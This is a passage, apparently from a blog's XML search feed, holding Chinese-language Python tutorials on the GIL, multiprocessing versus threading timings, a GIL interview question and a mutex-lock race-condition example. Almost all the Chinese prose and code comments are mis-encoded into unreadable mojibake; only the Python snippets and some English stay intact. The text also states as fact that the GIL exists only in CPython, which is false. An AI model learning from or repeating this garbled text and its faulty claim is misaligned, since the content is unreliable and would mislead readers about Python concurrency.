åˆ°Pythonä¸­ã€‚å®ƒä¸ºå•çº¿ç¨‹ç¨‹åºæä¾›äº†æ€§èƒ½æå‡ï¼Œå› ä¸ºåªéœ€è¦ç®¡ç†ä¸€ä¸ªé”ã€‚</p><h1 id="å¯¹å¤šçº¿ç¨‹Pythonç¨‹åºçš„å½±å“"><a href="#å¯¹å¤šçº¿ç¨‹Pythonç¨‹åºçš„å½±å“" class="headerlink" title="å¯¹å¤šçº¿ç¨‹Pythonç¨‹åºçš„å½±å“"></a>å¯¹å¤šçº¿ç¨‹Pythonç¨‹åºçš„å½±å“</h1><p>å½“æ‚¨æŸ¥çœ‹å…¸å‹çš„Pythonç¨‹åºæˆ–ä»»ä½•è®¡ç®—æœºç¨‹åºæ—¶ï¼Œå®ƒä»¬åœ¨æ€§èƒ½ä¸Šå—CPUé™åˆ¶çš„ç¨‹åºä¸å—I / Oé™åˆ¶çš„ç¨‹åºä¹‹é—´å­˜åœ¨å·®å¼‚ã€‚<br>CPUç»‘å®šç¨‹åºæ˜¯é‚£äº›å°†CPUæ¨å‘æé™çš„ç¨‹åºã€‚è¿™åŒ…æ‹¬è¿›è¡Œæ•°å­¦è®¡ç®—çš„ç¨‹åºï¼Œå¦‚çŸ©é˜µä¹˜æ³•ï¼Œæœç´¢ï¼Œå›¾åƒå¤„ç†ç­‰ã€‚<br>I/Oç»‘å®šç¨‹åºæ˜¯èŠ±è´¹æ—¶é—´ç­‰å¾…è¾“å…¥/è¾“å‡ºçš„ç¨‹åºï¼Œå¯ä»¥æ¥è‡ªç”¨æˆ·ï¼Œæ–‡ä»¶ï¼Œæ•°æ®åº“ï¼Œç½‘ç»œç­‰.I / Oç»‘å®šç¨‹åºæœ‰æ—¶éœ€è¦ç­‰å¾…å¤§é‡æ—¶é—´ï¼Œç›´åˆ°å®ƒä»¬ç”±äºæºå¯èƒ½éœ€è¦åœ¨è¾“å…¥/è¾“å‡ºå‡†å¤‡å¥½ä¹‹å‰è¿›è¡Œè‡ªå·±çš„å¤„ç†ï¼Œä¾‹å¦‚ï¼Œç”¨æˆ·è€ƒè™‘è¾“å…¥åˆ°è¾“å…¥æç¤ºä¸­çš„å†…å®¹æˆ–åœ¨å…¶ä¸­è¿è¡Œçš„æ•°æ®åº“æŸ¥è¯¢ï¼Œå› æ­¤ä»æºè·å–ä»–ä»¬éœ€è¦çš„å†…å®¹è‡ªå·±çš„è¿‡ç¨‹ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä½¿ç”¨CPUæ‰§è¡Œå€’è®¡æ—¶çš„ç¨‹åº</p><pre><code># single_threaded.pyimport timefrom threading import ThreadCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1start = time.time()countdown(COUNT)end = time.time()print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>å®ƒçš„è¿è¡Œæ—¶é—´:</p><blockquote><p>Time taken in seconds - 2.4703943729400635</p></blockquote><p>ä¿®æ”¹ä¸Šé¢çš„ä»£ç ,ä½¿ç”¨å¤šçº¿ç¨‹æ‰§è¡Œ</p><pre><code>import timefrom threading import ThreadCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1t1 = Thread(target=countdown, args=(COUNT//2,))t2 = Thread(target=countdown, args=(COUNT//2,))start = time.time()t1.start()t2.start()t1.join()t2.join()end = time.time()print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>æ‰§è¡Œæ—¶é—´:</p><blockquote><p>Time taken in seconds - 2.581101655960083</p></blockquote><p>ä¸¤ä¸ªç‰ˆæœ¬çš„å®Œæˆæ—¶é—´å‡ ä¹ç›¸åŒã€‚åœ¨å¤šçº¿ç¨‹ç‰ˆæœ¬ä¸­ï¼ŒGIL<strong>é˜»æ­¢</strong>äº†CPUç»‘å®š<strong>çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œ</strong>ã€‚<br>GILå¯¹I/Oç»‘å®šå¤šçº¿ç¨‹ç¨‹åºçš„æ€§èƒ½å½±å“ä¸å¤§ï¼Œå› ä¸ºçº¿ç¨‹åœ¨ç­‰å¾…I/Oæ“ä½œæ—¶å…±äº«é”ã€‚<br>ä½†æ˜¯çº¿ç¨‹å®Œå…¨å—CPUé™åˆ¶çš„ç¨‹åºï¼Œä¾‹å¦‚ï¼Œä½¿ç”¨çº¿ç¨‹å¤„ç†éƒ¨åˆ†å›¾åƒçš„ç¨‹åºï¼Œä¸ä»…ä¼šå› é”è€Œå˜æˆå•çº¿ç¨‹ï¼Œè€Œä¸”è¿˜ä¼šçœ‹åˆ°æ‰§è¡Œæ—¶é—´çš„å¢åŠ ï¼Œå¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œä¸ç¼–å†™ä¸ºå®Œå…¨å•çº¿ç¨‹çš„åœºæ™¯ç›¸æ¯”ã€‚è¿™ç§å¢åŠ æ˜¯ç”±é”æ·»åŠ çš„è·å–å’Œé‡Šæ”¾å¼€é”€çš„ç»“æœã€‚</p><h1 id="å¦‚ä½•è§£å†³Pythonçš„GILé—®é¢˜"><a href="#å¦‚ä½•è§£å†³Pythonçš„GILé—®é¢˜" class="headerlink" title="å¦‚ä½•è§£å†³Pythonçš„GILé—®é¢˜"></a>å¦‚ä½•è§£å†³Pythonçš„GILé—®é¢˜</h1><p>###1: ä½¿ç”¨å¤šè¿›ç¨‹<br>æ‚¨å¯ä»¥ä½¿ç”¨å¤šä¸ªè¿›ç¨‹è€Œä¸æ˜¯çº¿ç¨‹ã€‚æ¯ä¸ªPythonè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„Pythonè§£é‡Šå™¨å’Œå†…å­˜ç©ºé—´ï¼Œå› æ­¤GILä¸ä¼šæˆä¸ºé—®é¢˜ã€‚Pythonæœ‰ä¸€ä¸ªmultiprocessingæ¨¡å—ï¼Œå¯ä»¥è®©æˆ‘ä»¬åƒè¿™æ ·è½»æ¾åœ°åˆ›å»ºè¿›ç¨‹.<br>ä¸‹é¢çš„ä»£ç ä½¿ç”¨å¤šè¿›ç¨‹å®Œæˆå€’è®¡æ—¶</p><pre><code>from multiprocessing import Poolimport timeCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1if __name__ == &#39;__main__&#39;:    pool = Pool(processes=2)    start = time.time()    r1 = pool.apply_async(countdown, [COUNT//2])    r2 = pool.apply_async(countdown, [COUNT//2])    pool.close()    pool.join()    end = time.time()    print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>è¿è¡Œæ—¶é—´:</p><blockquote><p>Time taken in seconds - 1.7246742248535156<br>æ˜¯ä¸æ˜¯å¿«äº†å¾ˆå¤š.</p></blockquote><h3 id="2-ä½¿ç”¨å…¶ä»–Pythonè§£é‡Šå™¨"><a href="#2-ä½¿ç”¨å…¶ä»–Pythonè§£é‡Šå™¨" class="headerlink" title="2:ä½¿ç”¨å…¶ä»–Pythonè§£é‡Šå™¨"></a>2:ä½¿ç”¨å…¶ä»–Pythonè§£é‡Šå™¨</h3><p>Pythonæœ‰å¤šä¸ªè§£é‡Šå™¨å®ç°ã€‚åˆ†åˆ«ç”¨Cï¼ŒJavaï¼ŒCï¼ƒå’ŒPythonç¼–å†™çš„CPythonï¼ŒJythonï¼ŒIronPythonå’ŒPyPyæ˜¯æœ€å—æ¬¢è¿çš„ã€‚<strong>GILä»…å­˜åœ¨äºCPythonçš„åŸå§‹Pythonå®ç°ä¸­</strong>ã€‚å¦‚æœæ‚¨çš„ç¨‹åºåŠå…¶åº“å¯ç”¨äºå…¶ä»–å®ç°ä¹‹ä¸€ï¼Œé‚£ä¹ˆæ‚¨ä¹Ÿå¯ä»¥å°è¯•å®ƒä»¬ã€‚</p><h3 id="3-å°†å¤šçº¿ç¨‹å¤„ç†çš„ä¸šåŠ¡ç”¨å…¶ä»–è¯­è¨€å®ç°"><a href="#3-å°†å¤šçº¿ç¨‹å¤„ç†çš„ä¸šåŠ¡ç”¨å…¶ä»–è¯­è¨€å®ç°" class="headerlink" title="3:å°†å¤šçº¿ç¨‹å¤„ç†çš„ä¸šåŠ¡ç”¨å…¶ä»–è¯­è¨€å®ç°"></a>3:å°†å¤šçº¿ç¨‹å¤„ç†çš„ä¸šåŠ¡ç”¨å…¶ä»–è¯­è¨€å®ç°</h3><p>åœ¨ä¸šåŠ¡ä¸­ä½¿ç”¨å¤šçº¿ç¨‹çš„æ¨¡å—ä½¿ç”¨å…¶ä»–è¯­è¨€è¿›è¡Œå®ç°,ç„¶åä½¿ç”¨Pythonè°ƒç”¨,è¿™ä¹Ÿå°±æ˜¯Pythonè¢«ç§°ä¸º<strong>èƒ¶æ°´è¯­è¨€</strong>çš„åŸå› .</p><h1 id="GILé¢è¯•é¢˜"><a href="#GILé¢è¯•é¢˜" class="headerlink" title="GILé¢è¯•é¢˜"></a>GILé¢è¯•é¢˜</h1><p>æè¿°Python GILçš„æ¦‚å¿µï¼Œ ä»¥åŠå®ƒå¯¹pythonå¤šçº¿ç¨‹çš„å½±å“ï¼Ÿç¼–å†™ä¸€ä¸ªå¤šçº¿ç¨‹æŠ“å–ç½‘é¡µçš„ç¨‹åºï¼Œå¹¶é˜æ˜å¤šçº¿ç¨‹æŠ“å–ç¨‹åºæ˜¯å¦å¯æ¯”å•çº¿ç¨‹æ€§èƒ½æœ‰æå‡ï¼Œå¹¶è§£é‡ŠåŸå› ã€‚</p><p>Pythonä¹‹çˆ¶Guido(é¾Ÿå”)çš„å£°å:<a href="http://www.artima.com/forums/flat.jsp?forum=106&amp;thread=214235" target="_blank" rel="noopener">http://www.artima.com/forums/flat.jsp?forum=106&amp;thread=214235</a></p><p><strong>he language doesnâ€™t require the GIL â€“ itâ€™s only the CPython virtual machine that has historically been unable to shed it.</strong></p><p>å‚è€ƒç­”æ¡ˆ:</p><ol><li>Pythonè¯­è¨€å’ŒGILæ²¡æœ‰åŠæ¯›é’±å…³ç³»ã€‚ä»…ä»…æ˜¯ç”±äºå†å²åŸå› åœ¨Cpythonè™šæ‹Ÿæœº(è§£é‡Šå™¨)ï¼Œéš¾ä»¥ç§»é™¤GILã€‚</li><li>GILï¼šå…¨å±€è§£é‡Šå™¨é”ã€‚æ¯ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œçš„è¿‡ç¨‹éƒ½éœ€è¦å…ˆè·å–GILï¼Œä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æ‰§è¡Œä»£ç ã€‚</li><li><p>çº¿ç¨‹é‡Šæ”¾GILé”çš„æƒ…å†µï¼š åœ¨IOæ“ä½œç­‰å¯èƒ½ä¼šå¼•èµ·é˜»å¡çš„system callä¹‹å‰,å¯ä»¥æš‚æ—¶é‡Šæ”¾GIL,ä½†åœ¨æ‰§è¡Œå®Œæ¯•å,å¿…é¡»é‡æ–°è·å–GIL Python 3.xä½¿ç”¨è®¡æ—¶å™¨(æ‰§è¡Œæ—¶é—´è¾¾åˆ°é˜ˆå€¼åï¼Œå½“å‰çº¿ç¨‹é‡Šæ”¾GIL)æˆ–Python 2.xï¼Œticketsè®¡æ•°è¾¾åˆ°100</p><blockquote><pre><code>import  sysprint sys.getcheckinterval()        # 100</code></pre><p>pythonçš„å­—èŠ‚ç è§£é‡Šå™¨çš„å·¥ä½œåŸç†æ˜¯æŒ‰ç…§æŒ‡ä»¤çš„é¡ºåºä¸€æ¡ä¸€æ¡çš„é¡ºåºæ‰§è¡Œï¼ŒPythonå†…éƒ¨ç»´æŠ¤ç€ä¸€ä¸ªæ•°å€¼ï¼Œè¿™ä¸ªæ•°å€¼å°±æ˜¯Pythonå†…éƒ¨çš„æ—¶é’Ÿï¼Œå¦‚æœè¿™ä¸ªæ•°å€¼ä¸ºNï¼Œåˆ™æ„å‘³ç€Pythonåœ¨æ‰§è¡Œäº†Næ¡æŒ‡ä»¤ä»¥ååº”è¯¥ç«‹å³å¯åŠ¨çº¿ç¨‹è°ƒåº¦æœºåˆ¶ã€‚<br>Pythoné»˜è®¤æ˜¯åœ¨æ‰§è¡Œäº†100æ¡æŒ‡ä»¤åå¯åŠ¨çº¿ç¨‹è°ƒåº¦æœºåˆ¶ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªå€¼ä¸ä»…ä»…ç”¨æ¥è¿›è¡Œçº¿ç¨‹è°ƒåº¦ï¼Œåœ¨å†…éƒ¨ï¼ŒPythonä¹Ÿä½¿ç”¨å®ƒæ¥æ£€æŸ¥æ˜¯å¦æœ‰å¼‚æ­¥çš„æ—¶é—´ï¼ˆenventï¼‰å‘ç”Ÿï¼Œéœ€è¦å¤„ç†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ sys.setcheckinterval() æ¥è°ƒèŠ‚è¿™ä¸ªå€¼ã€‚<br>Pythonä¸­çš„å¤šçº¿ç¨‹æœºåˆ¶ä¹Ÿæ˜¯å»ºç«‹åœ¨æ“ä½œç³»ç»Ÿçš„åŸç”Ÿçº¿ç¨‹çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¯¹åº”ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œæœ‰ä¸åŒçš„å®ç°ï¼Œç„¶è€Œæœ€ç»ˆï¼Œåœ¨ä¸åŒçš„åŸç”Ÿçº¿ç¨‹åŸºç¡€ä¸Šï¼ŒPythonæä¾›äº†ä¸€å¥—ç»Ÿä¸€çš„æŠ½è±¡æœºåˆ¶ï¼Œç»™Pythonçš„ä½¿ç”¨è€…ä¸€ä¸ªéå¸¸ç®€å•è€Œæ–¹ä¾¿çš„å¤šçº¿ç¨‹å·¥å…·ç®±ï¼Œè¿™å°±æ˜¯pythonä¸­çš„ä¸¤ä¸ªModuleï¼šthreadä»¥åŠåœ¨å…¶ä¹‹ä¸Šçš„threadingã€‚</p></blockquote></li><li><p><strong>Pythonä½¿ç”¨å¤šè¿›ç¨‹æ˜¯å¯ä»¥åˆ©ç”¨å¤šæ ¸çš„CPUèµ„æºçš„ã€‚</strong></p></li><li><strong>å¤šçº¿ç¨‹çˆ¬å–æ¯”å•çº¿ç¨‹æ€§èƒ½æœ‰æå‡ï¼Œå› ä¸ºé‡åˆ°IOé˜»å¡ä¼šè‡ªåŠ¨é‡Šæ”¾GILé”</strong></li></ol><p>ä»€ä¹ˆæ—¶å€™ç”¨çº¿ç¨‹ä»€ä¹ˆæ—¶å€™ç”¨åç¨‹,ä»¥åŠä»€ä¹ˆæ—¶å€™ç”¨è¿›ç¨‹å‘¢?<br><strong>è®¡ç®—å¯†é›†å‹:è¿›ç¨‹</strong><br><strong>IOå¯†é›†å‹:çº¿ç¨‹,åç¨‹</strong><br>å› ä¸ºGILçš„åŸå› åœ¨å¤„ç†è®¡ç®—å¯†é›†å‹ä¸šåŠ¡çš„æ—¶å€™(ç§‘å­¦è®¡ç®—,æŒ–çŸ¿ç­‰)çº¿ç¨‹çš„æ€§èƒ½è¦è¿œæ¯”è¿›ç¨‹å¼±å¾ˆå¤š<br>ä½†æ˜¯åœ¨å¤„ç†IOå¯†é›†å‹ä¸šåŠ¡(çˆ¬è™«)çš„æ—¶å€™<strong>çº¿ç¨‹åœ¨ç­‰å¾…I/Oæ“ä½œæ—¶å…±äº«é”</strong>,æ‰€ä»¥çº¿ç¨‹çš„æ‰§è¡Œæ•ˆç‡è¦æ¯”è¿›ç¨‹å¼ºå¾ˆå¤š.</p><h1 id="æ–‡ç« ä¸­çš„ä¸€äº›æ¦‚å¿µ"><a href="#æ–‡ç« ä¸­çš„ä¸€äº›æ¦‚å¿µ" class="headerlink" title="æ–‡ç« ä¸­çš„ä¸€äº›æ¦‚å¿µ"></a>æ–‡ç« ä¸­çš„ä¸€äº›æ¦‚å¿µ</h1><p>å¹¶å‘:</p><blockquote><p>æŒ‡çš„æ˜¯ä»»åŠ¡æ•°å¤šäºCPUçš„æ ¸æ•°,é€šè¿‡æ“ä½œç³»ç»Ÿçš„å„ç§ä»»åŠ¡è°ƒåº¦ç®—æ³•,å®ç°ç”¨å¤šä¸ªä»»åŠ¡â€<strong>ä¸€èµ·</strong>â€œæ‰§è¡Œ(å®é™…ä¸Šæ€»æœ‰ä¸€äº›ä»»åŠ¡ä¸åœ¨æ‰§è¡Œï¼Œå› ä¸ºåˆ‡æ¢ä»»åŠ¡çš„é€Ÿåº¦ç›¸å½“å¿«ï¼Œçœ‹ä¸Šå»ä¸€èµ·æ‰§è¡Œè€Œå·²)</p></blockquote><p>å¹¶è¡Œ:</p><blockquote><p>æŒ‡çš„æ˜¯ä»»åŠ¡æ•°å°äºæˆ–ç­‰äºCPUçš„æ ¸æ•°,å³å¤šä¸ªä»»åŠ¡æ˜¯çœŸçš„ä¸€èµ·æ‰§è¡Œçš„.</p></blockquote><p>å†…å­˜æ³„éœ²</p><blockquote><p>åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œå†…å­˜æ³„æ¼æŒ‡ç”±äºç–å¿½æˆ–é”™è¯¯é€ æˆ<strong>ç¨‹åºæœªèƒ½é‡Šæ”¾å·²ç»ä¸å†ä½¿ç”¨çš„å†…å­˜</strong>ã€‚<strong>å†…å­˜æ³„æ¼å¹¶éæŒ‡å†…å­˜åœ¨ç‰©ç†ä¸Šçš„æ¶ˆå¤±</strong>ï¼Œè€Œæ˜¯åº”ç”¨ç¨‹åºåˆ†é…æŸæ®µå†…å­˜åï¼Œç”±äºè®¾è®¡é”™è¯¯ï¼Œå¯¼è‡´åœ¨é‡Šæ”¾è¯¥æ®µå†…å­˜ä¹‹å‰å°±å¤±å»äº†å¯¹è¯¥æ®µå†…å­˜çš„æ§åˆ¶ï¼Œä»è€Œé€ æˆäº†<strong>å†…å­˜çš„æµªè´¹</strong>ã€‚â€”WIKIç™¾ç§‘</p></blockquote><p>pythonå¤šçº¿ç¨‹æœºåˆ¶</p><blockquote><p><a href="https://www.cnblogs.com/chenchao1990/p/5101973.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenchao1990/p/5101973.html</a></p></blockquote><p>JITç¼–è¯‘å™¨</p><blockquote><p> OracleJDKæä¾›çš„HotspotJVM,æä¾›äº† JITï¼ˆJust-In-Timeï¼‰ç¼–è¯‘å™¨ï¼Œä¹Ÿå°±æ˜¯é€šå¸¸æ‰€è¯´çš„åŠ¨æ€ç¼–è¯‘å™¨,JITèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶å°†çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆæœºå™¨ç .</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>çº¿ç¨‹ä¸­çš„äº’æ–¥é”</title>
      <link href="/2018/11/11/xian-cheng-zhong-de-hu-chi-suo/"/>
      <url>/2018/11/11/xian-cheng-zhong-de-hu-chi-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤šçº¿ç¨‹å¼€å‘å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#å¤šçº¿ç¨‹å¼€å‘å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="å¤šçº¿ç¨‹å¼€å‘å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>å¤šçº¿ç¨‹å¼€å‘å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2><p>å‡è®¾ä¸¤ä¸ªçº¿ç¨‹t1å’Œt2éƒ½è¦å¯¹å…¨å±€å˜é‡g_num(é»˜è®¤æ˜¯0)è¿›è¡ŒåŠ 1è¿ç®—ï¼Œt1å’Œt2éƒ½å„å¯¹g_numåŠ 10æ¬¡ï¼Œg_numçš„æœ€ç»ˆçš„ç»“æœåº”è¯¥ä¸º20ã€‚</p><p>ä½†æ˜¯ç”±äºæ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œï¼Œæœ‰å¯èƒ½å‡ºç°ä¸‹é¢æƒ…å†µï¼š</p><ol><li><p>åœ¨g_num=0æ—¶ï¼Œt1å–å¾—g_num=0ã€‚æ­¤æ—¶ç³»ç»ŸæŠŠt1è°ƒåº¦ä¸ºâ€sleepingâ€çŠ¶æ€ï¼ŒæŠŠt2è½¬æ¢ä¸ºâ€runningâ€çŠ¶æ€ï¼Œt2ä¹Ÿè·å¾—g_num=0</p></li><li><p>ç„¶åt2å¯¹å¾—åˆ°çš„å€¼è¿›è¡ŒåŠ 1å¹¶èµ‹ç»™g_numï¼Œä½¿å¾—g_num=1</p></li><li><p>ç„¶åç³»ç»ŸåˆæŠŠt2è°ƒåº¦ä¸ºâ€sleepingâ€ï¼ŒæŠŠt1è½¬ä¸ºâ€runningâ€ã€‚çº¿ç¨‹t1åˆæŠŠå®ƒä¹‹å‰å¾—åˆ°çš„0åŠ 1åèµ‹å€¼ç»™g_numã€‚</p></li><li><p>è¿™æ ·å¯¼è‡´è™½ç„¶t1å’Œt2éƒ½å¯¹g_numåŠ 1ï¼Œä½†ç»“æœä»ç„¶æ˜¯g_num=1</p></li></ol><pre><code>from threading import Threadfrom time import sleep__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/4 15:58&#39;# å¤šçº¿ç¨‹åœ¨ä½¿ç”¨å…¨å±€å˜é‡çš„æ—¶å€™ä¼šå¼•å‘èµ„æºç«äº‰é—®é¢˜g_num = 0       # å…¨å±€å˜é‡def test1(num):    global g_num    for i in range(num):        g_num += 1    print(&#39;test1æ–¹æ³•ä¸­å…¨å±€å˜é‡çš„å€¼ä¸º:%d&#39;%g_num)def test2(num):    global g_num    for i in range(num):        g_num += 1    print(&quot;test2æ–¹æ³•ä¸­å…¨å±€å˜é‡çš„å€¼ä¸º:%d&quot;%g_num)def main():    t1 = Thread(target=test1,args=(1000000,))    t2 = Thread(target=test2,args=(1000000,))    t1.start()    t2.start()    sleep(5)    print(&quot;mainæ–¹æ³•å†…å…¨å±€å˜é‡çš„å€¼ä¸º:%d&quot;%g_num)if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="å¦‚ä½•è§£å†³å¤šçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…¨å±€å˜é‡è€Œé€ æˆçš„ç«äº‰é—®é¢˜"><a href="#å¦‚ä½•è§£å†³å¤šçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…¨å±€å˜é‡è€Œé€ æˆçš„ç«äº‰é—®é¢˜" class="headerlink" title="å¦‚ä½•è§£å†³å¤šçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…¨å±€å˜é‡è€Œé€ æˆçš„ç«äº‰é—®é¢˜"></a>å¦‚ä½•è§£å†³å¤šçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…¨å±€å˜é‡è€Œé€ æˆçš„ç«äº‰é—®é¢˜</h2><p>é‚£ä¹ˆå°±åº”è¯¥ä½¿ç”¨åŒæ­¥<br>åŒæ­¥å°±æ˜¯<strong>ååŒæ­¥è°ƒ</strong>ï¼ŒæŒ‰<strong>é¢„å®šçš„å…ˆåæ¬¡åºè¿›è¡Œè¿è¡Œ</strong>ã€‚å¦‚:ä½ è¯´å®Œï¼Œæˆ‘å†è¯´ã€‚<br><strong>â€œåŒâ€</strong>å­—ä»å­—é¢ä¸Šå®¹æ˜“ç†è§£ä¸ºä¸€èµ·åŠ¨ä½œ<br>å…¶å®ä¸æ˜¯ï¼Œ<strong>â€œåŒâ€å­—åº”æ˜¯æŒ‡ååŒã€ååŠ©ã€äº’ç›¸é…åˆã€‚</strong><br>å¦‚è¿›ç¨‹ã€çº¿ç¨‹åŒæ­¥ï¼Œå¯ç†è§£ä¸ºè¿›ç¨‹æˆ–çº¿ç¨‹Aå’ŒBä¸€å—é…åˆï¼ŒAæ‰§è¡Œåˆ°ä¸€å®šç¨‹åº¦æ—¶è¦ä¾é Bçš„æŸä¸ªç»“æœï¼Œäºæ˜¯åœä¸‹æ¥ï¼Œç¤ºæ„Bè¿è¡Œ;Bæ‰§è¡Œï¼Œå†å°†ç»“æœç»™A;Aå†ç»§ç»­æ“ä½œã€‚</p><h3 id="äº’æ–¥é”"><a href="#äº’æ–¥é”" class="headerlink" title="äº’æ–¥é”"></a>äº’æ–¥é”</h3><p>å½“å¤šä¸ªçº¿ç¨‹å‡ ä¹åŒæ—¶ä¿®æ”¹æŸä¸€ä¸ªå…±äº«æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œ<strong>åŒæ­¥æ§åˆ¶</strong><br>çº¿ç¨‹åŒæ­¥èƒ½å¤Ÿä¿è¯å¤šä¸ªçº¿ç¨‹å®‰å…¨è®¿é—®ç«äº‰èµ„æºï¼Œæœ€ç®€å•çš„åŒæ­¥æœºåˆ¶æ˜¯å¼•å…¥<strong>äº’æ–¥é”ã€‚</strong></p><blockquote><p>åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œäº’æ–¥æ˜¯å¹¶å‘æ§åˆ¶çš„ä¸€ç§ç‰¹æ€§ï¼Œå®ƒæ˜¯ä¸ºäº†é˜²æ­¢ç«äº‰æ¡ä»¶è€Œåˆ¶å®šçš„; è¦æ±‚ä¸€ä¸ªæ‰§è¡Œçº¿ç¨‹æ°¸è¿œä¸ä¼šè¿›å…¥å…¶å…³é”®éƒ¨åˆ†ï¼ŒåŒæ—¶å¦ä¸€ä¸ªå¹¶å‘æ‰§è¡Œçº¿ç¨‹è¿›å…¥å…¶è‡ªå·±çš„å…³é”®éƒ¨åˆ† â€”ç»´åŸºç™¾ç§‘</p></blockquote><p>äº’æ–¥é”ä¸ºèµ„æºå¼•å…¥ä¸€ä¸ªçŠ¶æ€ï¼š<strong>é”å®š/éé”å®š</strong><br><strong>æŸä¸ªçº¿ç¨‹è¦æ›´æ”¹å…±äº«æ•°æ®æ—¶ï¼Œå…ˆå°†å…¶é”å®šï¼Œæ­¤æ—¶èµ„æºçš„çŠ¶æ€ä¸ºâ€œé”å®šâ€ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½æ›´æ”¹ï¼›ç›´åˆ°è¯¥çº¿ç¨‹é‡Šæ”¾èµ„æºï¼Œå°†èµ„æºçš„çŠ¶æ€å˜æˆâ€œéé”å®šâ€ï¼Œå…¶ä»–çš„çº¿ç¨‹æ‰èƒ½å†æ¬¡é”å®šè¯¥èµ„æºã€‚äº’æ–¥é”ä¿è¯äº†æ¯æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå†™å…¥æ“ä½œï¼Œä»è€Œä¿è¯äº†å¤šçº¿ç¨‹æƒ…å†µä¸‹æ•°æ®çš„æ­£ç¡®æ€§ã€‚</strong><br><strong>ä½¿ç”¨äº’æ–¥é”è§£å†³ä¸Šé¢ä»£ç ä¸­å…¨å±€å˜é‡çš„èµ„æºç«äº‰é—®é¢˜</strong></p><pre><code>from threading import Lock, Threadfrom time import sleep__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/4 16:27&#39;# ä¸Šé”çš„åŸåˆ™:ä¸Šé”çš„ä»£ç è¶Šå°‘è¶Šå¥½g_num = 0  # å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡mutex = Lock()  # åˆ›å»ºä¸€ä¸ªäº’æ–¥é”,é»˜è®¤æ˜¯æ²¡æœ‰ä¸Šé”çš„def test1(num):    global g_num    for i in range(num):        mutex.acquire()  # ä¸Šé”        g_num += 1        mutex.release()  # è§£é”    print(&#39;åœ¨test2()æ–¹æ³•ä¸­å…¨å±€å˜é‡çš„å€¼%d&#39; % g_num)def test2(num):    global g_num    for i in range(num):        mutex.acquire()  # ä¸Šé”        g_num += 1        mutex.release()  # è§£é”    print(&#39;åœ¨test2()æ–¹æ³•ä¸­å…¨å±€å˜é‡çš„å€¼%d&#39; % g_num)def main():    # åˆ›å»ºçº¿ç¨‹å¯¹è±¡(å¹¶æ²¡æœ‰åˆ›å»ºçº¿ç¨‹å“¦)    t1 = Thread(target=test1, args=(100000,))    t2 = Thread(target=test2, args=(100000,))    t1.start()    t2.start()    sleep(2)    print(&#39;mainæ–¹æ³•ä¸­å…¨å±€å˜é‡çš„å€¼ä¸º:%d&#39; % g_num)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><strong>ä¸Šé”è§£é”è¿‡ç¨‹</strong></p><blockquote><ol><li>å½“ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨é”çš„acquire()æ–¹æ³•è·å¾—é”æ—¶ï¼Œé”å°±è¿›å…¥â€œlockedâ€çŠ¶æ€ã€‚</li></ol></blockquote><blockquote><ol start="2"><li>æ¯æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è·å¾—é”ã€‚å¦‚æœæ­¤æ—¶å¦ä¸€ä¸ªçº¿ç¨‹è¯•å›¾è·å¾—è¿™ä¸ªé”ï¼Œè¯¥çº¿ç¨‹å°±ä¼šå˜ä¸ºâ€œblockedâ€çŠ¶æ€ï¼Œç§°ä¸ºâ€œé˜»å¡â€ï¼Œç›´åˆ°æ‹¥æœ‰é”çš„çº¿ç¨‹è°ƒç”¨é”çš„release()æ–¹æ³•é‡Šæ”¾é”ä¹‹åï¼Œé”è¿›å…¥â€œunlockedâ€çŠ¶æ€ã€‚</li></ol></blockquote><blockquote><ol start="3"><li>çº¿ç¨‹è°ƒåº¦ç¨‹åºä»å¤„äºåŒæ­¥é˜»å¡çŠ¶æ€çš„çº¿ç¨‹ä¸­é€‰æ‹©ä¸€ä¸ªæ¥è·å¾—é”ï¼Œå¹¶ä½¿å¾—è¯¥çº¿ç¨‹è¿›å…¥è¿è¡Œï¼ˆrunningï¼‰çŠ¶æ€ã€‚</li></ol></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é”çš„å¥½å¤„: 